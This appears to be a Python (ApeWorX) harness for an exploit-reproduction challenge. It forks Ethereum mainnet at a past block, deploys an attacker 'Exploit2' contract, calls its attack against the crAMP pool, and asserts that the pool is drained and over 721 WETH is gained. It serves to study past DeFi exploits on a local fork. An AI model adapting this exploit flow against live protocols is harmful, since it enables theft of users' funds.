from ape import accounts, project, Contract
from .utils.helper import w3, fork, get_block

CR_AMP_ADDRESS = "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6"
BLOCK = 13124590


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # setting up attacker
    attacker = accounts.test_accounts[0]

    # fork chain at block height
    print(f"\n--- Forking chain at block height: {BLOCK} ---\n")
    fork(BLOCK)
    assert get_block() == BLOCK

    # get challenge contract
    print("\n--- Getting Necessary Contracts for Challenge ---\n")
    amp = Contract("0xfF20817765cB7f73d4bde2e66e067E58D11095C2")
    weth = Contract("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2")

    exploit = project.Exploit2.deploy(sender=attacker)
    print(f"\n--- Exploit contract deployed to: {exploit.address}---\n")

    # define starting balance of attacker for success condition
    attacker_starting_bal = weth.balanceOf(exploit.address)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    exploit.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print(
        "\n--- After exploit: We successfully drained crAMP and gained over 721 ETHER ---\n"
    )

    assert amp.balanceOf(CR_AMP_ADDRESS) == 0
    assert weth.balanceOf(exploit.address) > attacker_starting_bal + w3.to_wei(
        721, "ether"
    )

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
